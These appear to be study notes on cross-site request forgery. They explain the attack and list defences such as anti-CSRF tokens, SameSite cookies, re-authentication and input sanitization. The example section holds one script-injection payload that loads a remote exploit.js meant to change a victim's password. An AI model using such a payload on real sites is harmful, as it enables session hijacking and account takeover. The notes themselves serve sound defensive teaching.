### 📌 **What is CSRF?**

- A front-end vulnerability caused by **unfiltered user input**.
    
- Tricks a **logged-in user’s browser** into sending **unauthorized requests** to a web app.
    
- Attacker performs actions using the **victim’s session**, without their knowledge.
    

---

### 🧬 **How CSRF Works**

- May exploit:
    
    - **XSS vulnerabilities** to run malicious JavaScript.
        
    - **Unvalidated HTTP parameters or APIs**.
        
- Example: Automatically changing a user’s password via JavaScript while the user is logged in.
    

---

### 🧪 **CSRF Attack Example**

- Malicious payload (comment, link, etc.):
    
    ```html
    "><script src=//www.example.com/exploit.js></script>
    ```
    
- The `exploit.js` file would contain the malicious `JavaScript` code that changes the user's password. Developing the `exploit.js` in this case requires knowledge of this web application's password changing procedure and `APIs`.
    
    - Mimics the web app's password change request.
        
    - Executes in the **victim’s session**.
        
- Can target **admin accounts** to take control of backend servers.
    

---

### 🛡️ **Prevention Measures**

#### 🔹 **1. Input Sanitization & Validation**

| Type             | Description                                                         |
| ---------------- | ------------------------------------------------------------------- |
| **Sanitization** | Remove special/non-standard characters before display or storage.   |
| **Validation**   | Ensure input follows expected format (e.g., valid email, username). |

- Apply sanitization on **both input and output**.
    
- Always sanitize on **front end** and **back end**.
    

---

#### 🔹 **2. Security Mechanisms**

- **Anti-CSRF tokens**: Unique per request/session to validate legitimacy.
    
- **SameSite cookies**:
    
    - `SameSite=Strict` or `Lax` prevents cookies from being sent in cross-origin requests.
        
- **User re-authentication**: Require entering password before sensitive actions.
    
- **Modern browser protections**: Block auto-execution of some JavaScript.
    

---

#### 🔹 **3. Additional Layers**

- Use a **Web Application Firewall (WAF)** to detect/block injection attempts.
    
- But **do not rely solely on WAFs**; follow **secure coding practices**.
    

---
- **XSS and CSRF may still be exploited** in edge cases.
    
- Treat these protections as **layers**, not replacements for **secure development**.
---
[Cross-Site Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) from OWASP discusses the attack and prevention measures in greater detail.